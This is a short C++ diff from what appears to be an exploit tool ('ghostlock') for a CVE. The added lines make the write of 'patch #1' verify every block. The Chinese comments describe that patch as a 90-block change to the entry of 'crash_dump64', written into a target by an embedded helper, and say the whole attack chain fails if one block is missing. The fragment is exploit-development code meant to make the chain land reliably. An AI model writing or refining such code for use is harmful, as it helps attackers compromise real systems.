@@ -116,6 +116,12 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                         embed::splicehelper_padded_size());
                 request.offset = 0U;
                 request.width = 16U;
+                /*
+                 * patch #1 是 90 块的关键补丁（改 crash_dump64 的入口），一旦有一块没落就整条链失效，
+                 * 因此这里**不吃默认抽样**（WriteRequest 的默认 verify_every=32），保持逐块回读。
+                 * 载体写仍用默认抽样：那里块数多、按首块/每 32 块/末块采样已足够定位。
+                 */
+                request.verify_every = 0U;
                 /* patch #1 的镜像与来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:19-50
                  *  —— 那边 patch #1 = 内嵌 helper 按 kCrashDumpBlockBytes 逐块写进目标，offset 从 0 起）。 */
                 GL_LOGI("patch1: image=%zu offset=%llu width=%zu blocks=%zu source_fd=%d bridge=%d",
